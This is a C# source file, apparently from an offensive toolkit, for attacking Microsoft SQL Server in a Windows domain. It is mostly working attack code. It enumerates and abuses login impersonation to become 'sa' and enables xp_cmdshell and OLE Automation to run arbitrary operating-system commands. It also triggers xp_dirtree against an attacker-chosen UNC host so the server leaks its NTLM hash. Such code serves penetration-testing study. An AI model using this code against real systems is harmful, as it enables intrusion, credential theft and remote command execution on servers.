using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;

namespace ExtensionToolkit.Func
{
    internal class MsSql
    {
        public static void Sql(string[] args)
        {
            // sql list_impersonable dc01.corp1.com master
            if (args.Length < 3)
            {
                Console.WriteLine("Mandatory args: operation, server, db");
                return;
            }

            string operation = args[1]; // Corrigido para args[0] para pegar a operação
            string sqlServer = args[2];
            string db = args[3];

            SqlConnection con = AuthSql(sqlServer, db);

            var sqlMap = new Dictionary<string, Action>
            {
                { "check_login", () => CheckUserAndPriv(con) },
                { "path_injection", () => {
                        string targetHost = args.Length > 4 ? args[4] : null;
                        if (targetHost == null)
                        {
                            Console.WriteLine("Error: targetHost is required for path_injection. Pass target IP Address instead of hostname");
                            return;
                        }
                        PathInjection(con, targetHost);
                    }
                },
                { "list_impersonable", () => ListImpersonables(con) },
                { "impersonate_login", () => {
                        string targetUser = args.Length > 4 ? args[4] : null;
                        if (targetUser == null)
                        {
                            Console.WriteLine("Error: target user is required for impersonation");
                            return;
                        }
                        ExecuteImpersonationLogin(con, targetUser);                        
                    }
                },
                { "impersonate_user", () => {
                        string targetUser = args.Length > 4 ? args[4] : null;
                        if (targetUser == null)
                        {
                            Console.WriteLine("Error: target user is required for impersonation");
                            return;
                        }
                        ExecuteImpersonationUser(con, targetUser);
                    }
                },
                { "exec_xpcmdshell", () => {
                        if (args.Length <= 4)
                        {
                            Console.WriteLine("Error: cmd needed");
                            return;
                        }
                        string cmd = string.Join(" ", args.Skip(4));
                        ExecuteXpCmdshell(con, cmd);
                    }
                },
                { "exec_oamethod", () => {
                        if (args.Length <= 4)
                        {
                            Console.WriteLine("Error: cmd needed");
                            return;
                        }
                        string cmd = string.Join(" ", args.Skip(4));
                        ExecuteOaMethod(con, cmd);
                    }
                },
            };

            if (sqlMap.TryGetValue(operation, out Action action))
            {
                Console.WriteLine($"Executing operation: {operation}");
                try
                {
                    action();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine($"Unknown operation: {operation}");
            }

            Console.WriteLine("closing connection");
            con.Close();
        }

        public static SqlConnection AuthSql(string sqlServer, string database)
        {
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine($"Auth success with Kerberos on {sqlServer}, {database}");

            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            return con;
        }

        public static void ExecuteImpersonationUser(SqlConnection con, string user)
        {
            String executeas = $"use msdb; EXECUTE AS USER = '{user}';";
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine($"New Privileges: ");
            CheckUserAndPriv(con);
        }

        public static void ExecuteImpersonationLogin(SqlConnection con, string user)
        {
            String executeas = $"EXECUTE AS LOGIN = '{user}';";
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.Write($"New Privileges: ");
            CheckUserAndPriv(con);
        }

        public static void ExecuteXpCmdshell(SqlConnection con, string cmd)
        {
            ExecuteImpersonationLogin(con, "sa");
            
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = $"EXEC xp_cmdshell {cmd}";

            Console.WriteLine($"executing {execCmd}");

            SqlCommand  command = new SqlCommand(enable_xpcmd, con);
            SqlDataReader  reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();
        }

        public static void ExecuteOaMethod(SqlConnection con, string cmd)
        {
            ExecuteImpersonationLogin(con, "sa");

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
            Console.WriteLine($"executing {execCmd}");

            SqlCommand command = new SqlCommand(enable_ole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        public static void ListImpersonables(SqlConnection con)
        {
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            Console.WriteLine($"Attempting to execute: {query}");

            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            var impersonable = reader[0].ToString();
            Console.WriteLine($"Impersonable users: {impersonable}");
            reader.Close();
        }

        // If the hostname is given as an IP address, Windows will automatically revert to NTLM authentication instead of Kerberos authentication, giving us the hash
        public static void PathInjection(SqlConnection con, string host)
        {
            string query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
            Console.WriteLine($"Attempting to execute: {query}");

            using (SqlCommand command = new SqlCommand(query, con))
            {
                // Define o tempo limite para 30 segundos
                command.CommandTimeout = 30;

                try
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        // Processa os resultados aqui, se necessário
                    }
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"SQL Exception: {ex.Message}");
                }
            }
        }

        public static void CheckUserAndPriv(SqlConnection con)
        {

            string queryLogin = "SELECT SYSTEM_USER;";
            string queryUser = "SELECT USER_NAME();";
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string publicRole, adminRole;

            SqlCommand command = new SqlCommand(queryLogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            var login = reader[0].ToString();
            reader.Close();

            command = new SqlCommand(queryUser, con);
            reader = command.ExecuteReader();
            reader.Read();
            var user = reader[0].ToString();
            reader.Close();

            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 isPublic = Int32.Parse(reader[0].ToString());
            reader.Close();

            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 isAdmin = Int32.Parse(reader[0].ToString());
            reader.Close();

            if (isPublic == 1)
            {
                publicRole = "member of public role";
            }
            else
            {
                publicRole = "not member of public role";
            }

            if (isAdmin == 1)
            {
                adminRole = "member of sysadmin role";
            }
            else
            {
                adminRole = "not member of sysadmin role";
            }

            Console.WriteLine($"Login: {login}, Mapped User: {user}, {publicRole}, {adminRole}");
        }
    }
}
